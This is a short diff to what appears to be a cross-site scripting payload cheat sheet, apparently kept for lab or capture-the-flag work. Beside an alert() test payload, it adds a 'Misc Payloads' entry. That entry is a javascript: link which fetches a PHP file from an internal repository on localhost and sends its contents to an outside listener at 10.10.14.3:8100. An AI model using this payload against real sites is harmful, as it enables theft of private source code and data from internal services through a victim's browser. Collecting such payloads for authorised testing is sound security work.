@@ -223,3 +223,8 @@ Test Payloads
 <img src="" onerror=alert(window.origin)>
 ```
 
+# Misc Payloads
+```html
+# Used to fetch file contents from github repo.
+<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.14.3:8100/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">XSS test</a>
+```
